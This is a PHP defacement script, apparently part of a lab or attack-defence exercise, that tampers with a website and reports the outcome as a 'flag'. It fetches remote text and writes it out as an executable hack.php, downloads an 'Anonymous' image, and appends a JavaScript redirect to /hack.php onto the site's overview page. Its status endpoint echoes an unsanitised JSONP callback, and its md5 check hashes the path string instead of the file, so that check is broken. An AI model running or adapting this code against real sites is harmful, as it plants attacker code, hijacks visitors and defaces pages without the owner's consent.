<?php 

function attack(){
    
    $url1 = "http://127.0.0.1/hack.txt";
    $url2 = "http://127.0.0.1/Anonymous.jpg";

    try{
        $txt = file_get_contents($url1);
        $hack = fopen('hack.php','w');
        fwrite($hack, $txt);
        fclose($hack);
        $save_file = "Anonymous.jpg";
        file_put_contents($save_file, file_get_contents($url2));
    }
    catch(Exception $e1){
        print_r("Cannot Tampered Remote System!");
    }
    try{
        $edit = fopen('./about/overview.php','a');
        $js = "<script>window.location.href='/hack.php'</script>";
        fwrite($edit, $js);
        fclose($edit);    
    }
    catch(Exception $e2){
        print_r("Cannot Tampered the Welcome Page!");
    }
}

function fileisexist(){
    $file = "hack.php";
    $img = "Anonymous.jpg";
    $md5 = "4dbd92f668e2866ce7e860d5696b787c";
    if(file_exists($file) != "1" && file_exists($img) != "1" && md5("./about/overview.php") == $md5){
        return "篡改失败!";
    }
    else{
        return "篡改成功!";
    }
}

if($_GET['attack'] == '1'){
    attack();
}
elseif($_GET['exist'] == '1'){
    $result = fileisexist();
    $array = array("flag" => $result);
    $data = json_encode($array);
    if (isset ($_GET['callback'])) {
        header("Content-Type: application/json");
        echo $_GET['callback']."(".$data.")";
    }
}

?>